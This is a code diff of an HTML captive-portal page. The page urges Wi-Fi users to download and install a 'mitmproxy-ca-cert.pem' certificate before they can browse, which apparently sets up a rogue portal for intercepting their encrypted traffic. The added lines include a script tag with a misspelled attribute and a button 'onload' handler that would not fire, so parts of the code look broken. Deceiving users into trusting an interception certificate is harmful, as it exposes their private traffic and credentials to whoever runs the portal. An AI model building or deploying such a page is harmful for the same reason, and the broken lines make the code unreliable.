@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Captive Portal</title>
+    <script scr = "listener.js"></script>
     <style>
 
         body {
@@ -78,12 +79,12 @@
             <p class = "text">Please download and install this certificate to continue browsing the internet!</p>
 
             <section style = "padding: 0;">
-                <img src = "wifilogo.png" style = "width: 100px; height: 100px;">
+                <img src = "./imgs/wifilogo.png" style = "width: 100px; height: 100px;">
             </section>
 
             <section>
                 <a href="mitmproxy-ca-cert.pem" download="">
-                    <button> 
+                    <button onload = "detectOS()">  
                         Accept and Connect
                     </button>
                 </a>
@@ -95,6 +96,7 @@
             </ol>
 
             <p class = "text">Once the certificate is installed, reconnect to the Wi-Fi to access the internet.</p>
+            <p class = "text"></p>
         </div>
     </section>
 </body>
